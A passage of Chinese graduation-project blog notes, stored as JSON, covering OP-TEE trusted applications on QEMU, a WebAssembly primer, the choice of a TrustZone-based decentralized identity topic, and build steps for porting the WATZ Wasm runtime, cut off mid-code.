<code>uuidgen</code>\n）替换所有原来的UUID</li>\n<li>把所有 <code>hello_world</code> 改成\n<code>ke_hello_world</code></li>\n</ul>\n<h2 id=\"编译\">5.5 编译</h2>\n<p>直接回到 <code>build</code> 目录，运行 <code>make run</code>。</p>\n<p>就会自动把刚刚的 Hello World 编译到 OP-TEE 里。</p>\n<p>如何单独编译一个TA，之后再看……明天开始阅读 TSC-VEE</p>\n<p>看到 TSC-VEE 的文档里，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">For QEMU v8:</span><br><span class=\"line\"></span><br><span class=\"line\">Place the trust applications(TAs) in the optee-examples/ folder</span><br><span class=\"line\">Execute make run in the build folder</span><br><span class=\"line\">Run the TA.</span><br></pre></td></tr></table></figure>\n<p>说明就是这么运行的2333</p>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"交叉编译\">交叉编译</h2>\n<p>与交叉编译相对的改变是本地编译。</p>\n<p>本地编译就是编译出的代码只能在我本地运行，交叉编译就是在一个平台上生成可以在另一个平台运行的代码。</p>\n<p>本文提到的所有交叉编译，就是在Linux中编译可以在嵌入式环境中运行的可执行文件。</p>\n","categories":["笔记"],"tags":["TrustZone","毕设","op-tee","QEMU"]},{"title":"毕设03 - WebAssembly（WASM）简述","url":"/graduation-project/03/","content":"<p>TSC-VEE 的 github 仓库中，没有提供 TA 的实现。</p>\n<p>他的README里说，<code>tsc-vee</code> 这个目录里的就是 TA\n，但是里面完全不是 TA 的结构，找不到 <code>ta</code> <code>host</code>\n，甚至没有 <code>UUID</code> 。按照 README\n提供的运行方法，也无法编译运行。</p>\n<p>而且，<code>on REE</code> 和 <code>tsc-vee</code>\n两个目录里的内容完全一致。想必是上传的时候传错文件了。</p>\n<p>所以今天来看 WASM\n。一个是为毕设准备，同时也是为组里另一个项目准备。</p>\n<blockquote>\n<p>已经发邮件给一作和导师了，老师回复非常迅速，学长立刻附上了\n<code>tsc-vee</code>\n的关键代码！！非常感谢老师和学长对科研小白的包容！！再次感谢！！</p>\n</blockquote>\n<span id=\"more\"></span>\n<h1 id=\"webassemblywasm简述\">1 WebAssembly（WASM）简述</h1>\n<blockquote>\n<p>参考内容：https://www.cnblogs.com/detectiveHLH/p/9928915.html</p>\n</blockquote>\n<h2 id=\"诞生目的\">1.1 诞生目的</h2>\n<p>解决 Js 的性能瓶颈。</p>\n<figure>\n<img src=\"/graduation-project/03/image-20241001220144976.png\" alt=\"image-20241001220144976\">\n<figcaption aria-hidden=\"true\">image-20241001220144976</figcaption>\n</figure>\n<p>Js 代码执行流程：</p>\n<ol type=\"1\">\n<li>载入源码</li>\n<li>解析成 AST （抽象语法树）</li>\n<li>编译成字节码</li>\n<li>翻译成机器码</li>\n</ol>\n<p>其中使用到了 JIT (Just in Time)\n来检测热点代码，加入缓存以优化翻译次数。</p>\n<p>但是，由于 Js\n的动态变量类型，同一个函数中的变量类型不确定，导致翻译出的机器码也不确定。引擎的优化就失去了作用。</p>\n<p>为了解决这个问题，出现了 <code>asm.js</code> 。作为一个 Js\n的严格子集，所有 <code>asm.js</code> 的代码都是合法的 Js\n代码，但是是通过一些诡异的手段，限制函数里面的变量值类型确定。例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">asmJs</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"string\">'use asm'</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> myInt = <span class=\"number\">0</span> | <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> myDouble = +<span class=\"number\">1.1</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p><code>0 | 0</code> 一定是 int ，<code>+1.1</code> 一定是 double。</p>\n<p>但是这还有一些问题：</p>\n<ul>\n<li>写起来非常不优雅，太难看了</li>\n<li>只解决了 JIT 部分的加速，然而最慢的部分是 Js\n代码的语法解析和字节码编译。</li>\n</ul>\n<p>于是，提出了 WebAssembly</p>\n<h2 id=\"wasm-的优势\">1.2 WASM 的优势</h2>\n<p>WASM 是编译器编译之后的中间代码，也就是可以直接从上面的\n<em>第4步-翻译成机器码</em> 开始执行。</p>\n<p>WASM\n编译得到的代码体积小，速度快，强制的强静态类型，有沙盒化的执行环境。可以直接由\nC/C++/Rust 编译得到。</p>\n<p>简言之：</p>\n<ul>\n<li><strong>执行效率</strong>：Web程序里可以直接调用由 C/C++/Rust\n编写的函数，这大大提高了Web项目的执行效率。测试表明，基本上可以优化至原速度的\n2 倍，最高甚至可以达到 6 倍。</li>\n<li><strong>移植性</strong>：一些原先由 C/C++/Rust\n编写、有高性能需求的项目，例如 Unity、Unreal 游戏引擎、谷歌地球\n等，可以直接将原来的项目编译成 WASM，移植到 Web 上。</li>\n</ul>\n<h2 id=\"如何使用-wasm\">1.3 如何使用 WASM</h2>\n<p>开发工具：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Fzc2VtYmx5U2NyaXB0L2Fzc2VtYmx5c2NyaXB0\">AssemblyScript<i class=\"fa fa-external-link-alt\"></i></span>。支持直接将\nTypeScript 编译成 WebAssembly。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tyaXBrZW4vZW1zY3JpcHRlbg==\">Emscripten<i class=\"fa fa-external-link-alt\"></i></span>。可以将\nC/C++/Rust 等高级语言编译成 WebAssembly</li>\n</ul>\n<p>流程：</p>\n<ol type=\"1\">\n<li><p>编写 C/C++/Rust 的原生函数</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">int</span> a, <span class=\"type\">int</span> b)</span> {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p></li>\n<li><p>编译成 wasm</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">emcc test.c -Os -s WASM=1 -s SIDE_MODULE=1 -o test.wasm</span><br></pre></td></tr></table></figure></p></li>\n<li><p>在 Node 中调用</p>\n<p><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">'fs'</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> src = <span class=\"keyword\">new</span> <span class=\"title class_\">Uint8Array</span>(fs.<span class=\"title function_\">readFileSync</span>(<span class=\"string\">'./test.wasm'</span>));</span><br><span class=\"line\"><span class=\"keyword\">const</span> env = {</span><br><span class=\"line\">\t<span class=\"attr\">memoryBase</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t<span class=\"attr\">tableBase</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t<span class=\"attr\">memory</span>: <span class=\"keyword\">new</span> <span class=\"title class_\">WebAssembly</span>.<span class=\"title class_\">Memory</span>({</span><br><span class=\"line\">\t\t<span class=\"attr\">initial</span>: <span class=\"number\">256</span></span><br><span class=\"line\">\t}),</span><br><span class=\"line\">\t<span class=\"attr\">table</span>: <span class=\"keyword\">new</span> <span class=\"title class_\">WebAssembly</span>.<span class=\"title class_\">Table</span>({</span><br><span class=\"line\">\t\t<span class=\"attr\">initial</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">element</span>: <span class=\"string\">'anyfunc'</span></span><br><span class=\"line\">\t}),</span><br><span class=\"line\">\t<span class=\"attr\">abort</span>: <span class=\"function\">() =&gt;</span> {<span class=\"keyword\">throw</span> <span class=\"string\">'abort'</span>;}</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title class_\">WebAssembly</span>.<span class=\"title function_\">instantiate</span>(src, {<span class=\"attr\">env</span>: env})</span><br><span class=\"line\">.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">result</span> =&gt;</span> {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result.<span class=\"property\">instance</span>.<span class=\"property\">exports</span>.<span class=\"title function_\">_add</span>(<span class=\"number\">20</span>, <span class=\"number\">89</span>));</span><br><span class=\"line\">})</span><br><span class=\"line\">.<span class=\"title function_\">catch</span>(<span class=\"function\"><span class=\"params\">e</span> =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e));</span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"node.js-与-v8\">Node.js 与 V8</h2>\n<p>Node.js 和 V8 之间的关系密切，Node.js 是一个基于 V8\n引擎构建的服务器端 JavaScript 运行时环境。</p>\n<h3 id=\"v8-引擎\">1. <strong>V8 引擎：</strong></h3>\n<ul>\n<li><strong>V8</strong> 是由 Google 开发的开源 JavaScript\n引擎，它主要用于 Chrome 浏览器中解释和执行 JavaScript 代码。V8 将\nJavaScript 编译为机器代码，从而提高了 JavaScript 的执行速度。</li>\n<li>Node.js 使用 V8 作为其底层 JavaScript 引擎，这使得 Node.js\n能够在服务器端执行 JavaScript 代码，而不仅仅是在浏览器中使用。</li>\n</ul>\n<h3 id=\"node.js\">2. <strong>Node.js：</strong></h3>\n<ul>\n<li><strong>Node.js</strong> 是一个开源、跨平台的运行时环境，它基于 V8\n引擎构建，旨在让开发者能够在服务器端使用 JavaScript\n编写高效的网络应用程序。Node.js\n提供了许多用于文件系统、网络、进程等操作的库，使得开发者无需依赖浏览器的\nAPI。</li>\n<li>Node.js 的架构不仅仅是 JavaScript，它还包含了一些原生 C++\n代码，来提供底层系统操作能力，如文件操作、网络请求等。</li>\n</ul>\n<p>V8 引擎现在已经支持了 WebAssembly。</p>\n<h2 id=\"其他资料\">其他资料</h2>\n<p>非常入门的博客：https://xie.infoq.cn/article/0bb5ff2fa5d5d9db492c88a4c</p>\n<p>WebAssembly原理与核心技术：https://book.douban.com/subject/35233448/</p>\n","categories":["笔记"],"tags":["WASM","毕设"]},{"title":"毕设04 - 阶段性总结，明确题目","url":"/graduation-project/04/","content":"<p>看完了 《WebAssembly原理与核心技术》，重新审视一下原来的目标。</p>\n<span id=\"more\"></span>\n<p>原来的目标是：把 Wasm 移植到 TSC-VEE 中。</p>\n<p>TSC-VEE 是将 evmone 这个高性能的 evm 实现，用 C 语言重构后，编译成 TA\n移植到 TEE 上。本质上就是 evmone，加上论文中提到的三个优化方案。</p>\n<h1 id=\"总结\">总结</h1>\n<p>目前进度：</p>\n<ol type=\"1\">\n<li><p>配了虚拟机的环境，可以在本地虚拟机里运行可信执行环境（OP-TEE）和可信执行程序</p></li>\n<li><p>看了、跑了 TSC-VEE 的源码 ；</p>\n<ul>\n<li><p>问题1：github 上开源的源码有问题（两个文件夹的内容重复，没有 TA\n的实现）</p>\n<p>已经向作者发邮件，获得了最新的代码</p></li>\n<li><p>问题2：代码的实现中，只包含了<u>混合粒度字节码分析</u>一个优化，内存管理、指令预取的优化没有在代码中体现</p>\n<p>计划再向作者发邮件询问</p></li>\n</ul></li>\n<li><p>分析我需要做的事：</p>\n<ol type=\"1\">\n<li><p>要在 TEE 中执行 Wasm 程序：</p>\n<ol type=\"1\">\n<li>学习了 Wasm，阅读《WebAssembly原理与核心技术》，学习 Wasm\n运行时虚拟机的实现。</li>\n<li>有没有现成的 Wasm 运行时，可以嵌入到 TEE 中？有。Wamr，轻量级的 Wasm\n运行时。</li>\n<li>有没有嵌入到 TEE 中的实例？有。TWINE。（另有 WATZ）</li>\n</ol></li>\n<li><p>把智能合约编译成 Wasm 程序：</p>\n<ol type=\"1\">\n<li><p>有现成 evm2wasm 项目，可以把 evm 字节码转换成 wasm\n字节码。（但是这个项目已经归档，不能保证效果，还没实验）</p></li>\n<li><p>如果不局限于<strong>以太坊</strong>智能合约？可以使用原生就是WebAssembly虚拟机的区块链平台做实验？Polkadot</p>\n<blockquote>\n<p><strong>Polkadot</strong></p>\n<ul>\n<li><strong>智能合约语言</strong>：Ink! (Rust-based),\nSolidity（通过EVM兼容链）</li>\n<li><strong>虚拟机</strong>：Wasm（WebAssembly）虚拟机</li>\n<li>Polkadot\n提供了一种基于WebAssembly的智能合约环境，可以支持多种编程语言，也支持通过特定平行链与EVM兼容。</li>\n</ul>\n</blockquote></li>\n<li></li>\n</ol></li>\n<li><p>优化这个 Wasm 智能合约的执行过程：</p>\n<ol type=\"1\">\n<li><p>gas 计算？如何实现这个？一个指令的 gas 消耗是 以太坊\n官方规定的，每一个版本的 evm 都有他们自己的 gas\n消耗。我现在修改了智能合约的指令集，如何评估每个指令的gas消耗？还是说我就不用管\ngas 消耗？</p></li>\n<li><p>针对 TEE 的特性进行优化。（内存小，读指令），参考 TSC-VEE</p>\n<p>是不是能加入内存管理的功能，即时释放内存，使得在 TEE\n中能够运行更多智能合约</p>\n<p>是不是能指令预取，增加 TEE 中读取指令的速度</p>\n<p>......</p></li>\n</ol></li>\n</ol></li>\n<li><p>此外还找了一篇论文（有些还没详细看，因为看了一点发现太多基础知识不懂，先去学\nOP-TEE 的基础架构）：</p>\n<ol type=\"1\">\n<li><p>在 TrustZone 上执行 Fabric 的智能合约：TZ4Fabric: Executing Smart\nContracts with ARM TrustZone</p></li>\n<li><p>在 TrustZone 上执行 WebAssembly 运行时，并实现远程认证：WATZ: A\nTrusted WebAssembly Runtime Environment with Remote Attestation for\nTrustZone</p></li>\n<li><p>在 TEE 上执行 Wasm 运行时（TEE 是 Intel SGX）：TWINE: An Embedded\nTrusted Runtime for WebAssembly</p></li>\n<li><p>用于检测 Wasm 智能合约中的漏洞：WASAI: uncovering vulnerabilities\nin Wasm smart contracts</p></li>\n</ol></li>\n</ol>\n<p>总结：提供了一个能够在 TEE 上运行以 Wasm 实现的智能合约的框架。</p>\n<p>优点：</p>\n<ul>\n<li>安全（TrustZone）</li>\n<li>可移植性、易迁移性、<strong>接近</strong>原生的速度（Wasm）</li>\n<li>性能优化（TSC-VEE）</li>\n</ul>\n<p>相关项目：</p>\n<ul>\n<li>TEE 上运行 Wasm</li>\n<li>Wasm 智能合约</li>\n<li>TEE 上运行智能合约</li>\n<li>对 TEE 上的智能合约进行优化</li>\n</ul>\n<p><del>我做的：在 Tee 上 运行 Wasm 实现的智能合约，并优化</del></p>\n<p>如果我要自己实现把 Wamr 迁移到 TrustZone OP-TEE 的 TEE\n上的话，最关键还是得学 OP-TEE 的架构</p>\n<p>又看了看论文（WATZ 和 TWINE），发现……作用有限……</p>\n<p>论文里只写个大概轮廓，代码细节几乎找不见，直接看源码也一头雾水，怎么跑起来的这是……</p>\n<hr>\n<p>要有一个看得见的东西，</p>\n<p>数字身份</p>\n<p>Intel SGX，</p>\n<p>基于可信执行环境的区块链数字身份</p>\n<p>题目：基于 TrustZone 的元宇宙分布式数字身份系统研究与实现</p>\n<p>研究内容：</p>\n<ul>\n<li>TrustZone\n<ul>\n<li>软件：OP-TEE</li>\n<li>硬件：Raspberry Pi 3B+</li>\n</ul></li>\n<li>分布式数字身份\n<ul>\n<li>区块链平台</li>\n<li>智能合约</li>\n<li>元宇宙数字身份（W3C-DID）</li>\n</ul></li>\n<li>WebAssembly\n<ul>\n<li>在 TrustZone 中运行 WebAssembly 实现的智能合约</li>\n</ul></li>\n</ul>\n<p>应用场景：</p>\n<p>元宇宙作为背景，电影院作为应用场景，TrustZone 引入安全</p>\n<h3 id=\"研究方向\">研究方向</h3>\n<p>本课题的研究方向集中在基于可信执行环境（Trusted Execution\nEnvironment，TEE）和区块链技术的分布式数字身份系统设计与实现。随着元宇宙技术的迅速发展，用户在虚拟空间中的身份管理和认证问题日益凸显。现有的数字身份管理系统大多依赖于中心化的认证模式，容易面临数据泄露和隐私侵害等问题。分布式数字身份（Decentralized\nIdentity，DID）作为一种去中心化的身份管理方案，能够在不依赖第三方机构的情况下，实现用户身份的自主认证与控制。TrustZone\n技术提供了隔离的安全环境，通过与分布式数字身份相结合，可以为元宇宙用户提供更安全、可信的身份管理机制。</p>\n<p>本研究方向结合可信计算、区块链、智能合约与 WebAssembly\n等前沿技术，旨在探索如何在 TrustZone 架构中实现基于 WebAssembly\n的智能合约执行环境，并为分布式数字身份系统提供解决方案。该研究有望为元宇宙用户身份管理提供新的技术方案，推动去中心化身份认证在元宇宙中的应用落地。</p>\n<h3 id=\"课题简介\">课题简介</h3>\n<p>随着元宇宙的迅猛发展，用户在虚拟世界中的身份管理和隐私保护问题成为亟待解决的挑战。传统的身份认证系统大多依赖于中心化服务器，存在单点故障风险，且用户的隐私数据易被不当获取和滥用。为了解决这一问题，分布式数字身份（Decentralized\nIdentity，DID）系统应运而生，它利用区块链的去中心化特性，实现了用户对自己身份信息的自主控制。然而，如何在保证身份安全性和隐私保护的同时，提升元宇宙中的身份管理和认证效率，是当前面临的一大挑战。</p>\n<p>本课题将基于 ARM TrustZone 可信执行环境（Trusted Execution\nEnvironment，TEE）设计并实现一个适用于元宇宙的分布式数字身份系统。具体而言，本研究将利用一个可信执行环境框架（如\nOP-TEE）在 Raspberry Pi 3B+\n或华为鲲鹏开发板等硬件平台上搭建安全环境，并在该环境中运行基于\nWebAssembly 的智能合约，实现数字身份的创建、认证和验证过程。TrustZone\n提供的隔离环境能够确保用户身份数据的安全性，同时通过区块链平台实现身份信息的去中心化存储和验证，从而防止未经授权的访问与篡改。WebAssembly\n作为智能合约的执行环境，运行在 TrustZone 的安全世界中。通过将\nWebAssembly\n与智能合约结合，在保证执行效率的同时，提升灵活性与可移植性。此外，课题将引入\nW3C\n提出的去中心化身份标准（W3C-DID），确保用户在元宇宙中的身份符合国际标准，具备兼容性和扩展性。</p>\n<p>本课题的预期成果包括一个在 TrustZone\n中运行的分布式数字身份原型系统。该系统将展示如何在可信执行环境中保障数字身份的安全性，并通过区块链实现去中心化管理，为元宇宙中的身份认证提供了一种全新的安全方案。此外，课题还将实现一个基于分布式数字身份的应用场景原型，例如一个基于分布式数字身份的虚拟电影院系统，用户可以通过其去中心化的数字身份进行购票、进行身份验证等操作。该应用场景将进一步验证本课题系统的实际可用性和拓展性。此研究不仅具备学术价值，还将在未来的元宇宙应用场景中具有广泛的应用前景。</p>\n","categories":["笔记"],"tags":["TrustZone","毕设","op-tee","QEMU","TSC-VEE"]},{"title":"毕设05 - WATZ 迁移","url":"/graduation-project/05/","content":"<ul>\n<li>单独编译 OPTEE 的 CA/TA 的方法。</li>\n<li>移植 WATZ 到现在的 OPTEE 中。</li>\n<li>测试 WATZ 。</li>\n</ul>\n<span id=\"more\"></span>\n<h1 id=\"备忘\">备忘</h1>\n<h2 id=\"makefile中-debug-方式\">MakeFile中 Debug 方式</h2>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\">log_to_file = <span class=\"variable\">$(<span class=\"built_in\">shell</span>  echo \"Makefile Path     : $(<span class=\"built_in\">realpath</span> $(<span class=\"built_in\">lastword</span> <span class=\"variable\">$(MAKEFILE_LIST)</span>)</span>)<span class=\"string\">\" &gt;&gt; /root/my-test.log &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"string\">                       echo \"</span>Parameter Name    : $(1)<span class=\"string\">\" &gt;&gt; /root/my-test.log &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"string\">                       echo \"</span>Parameter Value   : $(2)<span class=\"string\">\" &gt;&gt; /root/my-test.log &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"string\">                       echo \"</span>==============================<span class=\"string\">\" &gt;&gt; /root/my-test.log)</span></span><br><span class=\"line\"><span class=\"string\">$(call log_to_file, \"</span>VAR_NAME<span class=\"string\">\", \"</span><span class=\"variable\">$(VAR_NAME)</span><span class=\"string\">\")</span></span><br></pre></td></tr></table></figure>\n<p>在 <code>~/.bashrc</code> 中添加如下代码，可以在任何地方通过\n<code>viewlog</code> 快速查看日志：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">alias</span> viewlog=<span class=\"string\">\"cat /root/my-test.log\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"重新编译-optee\">重新编译 OPTEE</h2>\n<p>在 <code>optee/build</code> 中：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">make  FORCE_UNSAFE_CONFIGURE=1 -j`<span class=\"built_in\">nproc</span>`</span><br></pre></td></tr></table></figure>\n<h2 id=\"手动编译-cata\">手动编译 CA/TA</h2>\n<h3 id=\"optee_client\">optee_client</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /root/optee/optee_client</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf build</span><br><span class=\"line\">make clean</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">export</span> TA_DEV_KIT_DIR=/root/optee/build/../optee_os/out/arm/export-ta_arm64 </span><br><span class=\"line\"><span class=\"built_in\">export</span> CROSS_COMPILE=<span class=\"string\">\"/usr/bin/ccache /root/optee/build/../toolchains/aarch64/bin/aarch64-linux-gnu-\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> build</span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake ..</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p>先手动编译 <code>optee_client</code> ，为了得到\n<code>libteec.so</code></p>\n<h3 id=\"ta\">TA</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> TA_DEV_KIT_DIR=/root/optee/build/../optee_os/out/arm/export-ta_arm64</span><br><span class=\"line\"><span class=\"built_in\">export</span> CROSS_COMPILE=<span class=\"string\">\"/usr/bin/ccache /root/optee/build/../toolchains/aarch64/bin/aarch64-linux-gnu-\"</span></span><br><span class=\"line\">make run</span><br></pre></td></tr></table></figure>\n<h3 id=\"ca\">CA</h3>\n<p>修改 <code>optee/optee_examples</code> 中的\n<code>CMakeList.txt</code>：</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cmake_minimum_required</span> (VERSION <span class=\"number\">3.2</span>)</span><br><span class=\"line\"><span class=\"keyword\">project</span> (optee_examples C)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># https://cmake.org/Wiki/CMake_Useful_Variables</span></span><br><span class=\"line\"><span class=\"keyword\">set</span> (CMAKE_TOOLCHAIN_FILE CMakeToolchain.txt)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 增加如下两行，改成对应的路径</span></span><br><span class=\"line\"><span class=\"keyword\">include_directories</span>(/root/optee/optee_client/libteec/<span class=\"keyword\">include</span>)</span><br><span class=\"line\"><span class=\"keyword\">link_directories</span>(/root/optee/optee_client/out/libteec)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(GNUInstallDirs)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_compile_options</span> (-Wall)</span><br><span class=\"line\"><span class=\"comment\">#add_compile_options (</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wall -Wbad-function-cast -Wcast-align</span></span><br><span class=\"line\"><span class=\"comment\">#       -Werror-implicit-function-declaration -Wextra</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wfloat-equal -Wformat-nonliteral -Wformat-security</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wformat=2 -Winit-self -Wmissing-declarations</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wmissing-format-attribute -Wmissing-include-dirs</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wmissing-noreturn -Wmissing-prototypes -Wnested-externs</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wpointer-arith -Wshadow -Wstrict-prototypes</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wswitch-default -Wunsafe-loop-optimizations</span></span><br><span class=\"line\"><span class=\"comment\">#       -Wwrite-strings -Werror -fPIC</span></span><br><span class=\"line\"><span class=\"comment\">#)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">find_program</span>(CCACHE_FOUND ccache)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(CCACHE_FOUND)</span><br><span class=\"line\">        <span class=\"keyword\">set_property</span>(GLOBAL PROPERTY RULE_LAUNCH_COMPILE ccache)</span><br><span class=\"line\">        <span class=\"keyword\">set_property</span>(GLOBAL PROPERTY RULE_LAUNCH_LINK ccache)</span><br><span class=\"line\"><span class=\"keyword\">endif</span>(CCACHE_FOUND)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">file</span>(GLOB dirs *)</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(dir <span class=\"variable\">${dirs}</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">EXISTS</span> <span class=\"variable\">${dir}</span>/CMakeLists.txt)</span><br><span class=\"line\">                <span class=\"keyword\">add_subdirectory</span>(<span class=\"variable\">${dir}</span>)</span><br><span class=\"line\">        <span class=\"keyword\">endif</span>()</span><br><span class=\"line\"><span class=\"keyword\">endforeach</span>()</span><br></pre></td></tr></table></figure>\n<p>然后进行编译，最终得到 <code>optee_examples</code> 中所有的 CA：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> build</span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake -DCMAKE_C_COMPILER=<span class=\"string\">\"/root/optee/build/../toolchains/aarch64/bin/aarch64-linux-gnu-gcc\"</span> ..</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<h1 id=\"编译-watz-的-cata\">编译 WATZ 的 CA/TA</h1>\n<h2 id=\"移植-optee_os\">移植 optee_os</h2>\n<p>由于 WATZ 基于老版本的 optee_os 进行了修改，想在最新的 optee_os\n中编译运行 CA/TA 需要修改部分代码。</p>\n<p>在 <code>/optee/optee_os/lib/libutee/include/pta_system.h</code>\n中添加：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * UNOFFICIAL API EXTENSION by WaTZ</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Change the protection of mapped memory pages</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PTA_SYSTEM_MPROTECT\t\t20</span></span><br></pre></td></tr></table></figure>\n<p>在\n<code>/optee/optee_os/lib/libutee/include/tee_internal_api_extensions.h</code>\n中添加：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * UNOFFICIAL API EXTENSION by WaTZ</span></span><br><span class=\"line\"><span class=\"comment\"> * tee_mprotect() - Change the protection of mapped memory pages</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">TEE_Result <span class=\"title function_\">tee_mprotect</span><span class=\"params\">(<span class=\"type\">void</span> *buf, <span class=\"type\">size_t</span> len, <span class=\"type\">uint32_t</span> prot)</span>;</span><br></pre></td></tr></table></figure>\n<p>在 <code>/optee/optee_os/lib/libutee/tee_system_pta.c</code>\n中添加：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEE_Result <span class=\"title function_\">tee_mprotect</span><span class=\"params\">(<span class=\"type\">void</span> *buf, <span class=\"type\">size_t</span> len, <span class=\"type\">uint32_t</span> prot)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">\tTEE_Result res = TEE_SUCCESS;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_VALUE_INPUT,</span><br><span class=\"line\">\t\t\t\t\t       TEE_PARAM_TYPE_VALUE_INPUT,</span><br><span class=\"line\">\t\t\t\t\t       TEE_PARAM_TYPE_NONE,</span><br><span class=\"line\">\t\t\t\t\t       TEE_PARAM_TYPE_NONE);</span><br><span class=\"line\">\tTEE_Param params[TEE_NUM_PARAMS] = { };</span><br><span class=\"line\"></span><br><span class=\"line\">\tparams[<span class=\"number\">0</span>].value.a = len;</span><br><span class=\"line\">\tparams[<span class=\"number\">0</span>].value.b = prot;</span><br><span class=\"line\">\treg_pair_from_64((<span class=\"type\">vaddr_t</span>)buf, &amp;params[<span class=\"number\">1</span>].value.a, &amp;params[<span class=\"number\">1</span>].value.b);</span><br><span class=\"line\"></span><br><span class=\"line\">\tres = invoke_system_pta(PTA_SYSTEM_MPROTECT, param_types, params);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (res)</span><br><span class=\"line\">\t\tEMSG(<span class=\"string\">\"Invoke PTA_SYSTEM_MPROTECT: buf %p, len %#zx, prot %u\"</span>, buf, len, prot);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>之后增加系统调用：</p>\n<p>在 <code>core/pta/system.c</code> 中添加：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> TEE_Result <span class=\"title function_\">system_mprotect</span><span class=\"params\">(<span class=\"keyword\">struct</span> user_mode_ctx *uctx, <span class=\"type\">uint32_t</span> param_types,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       TEE_Param 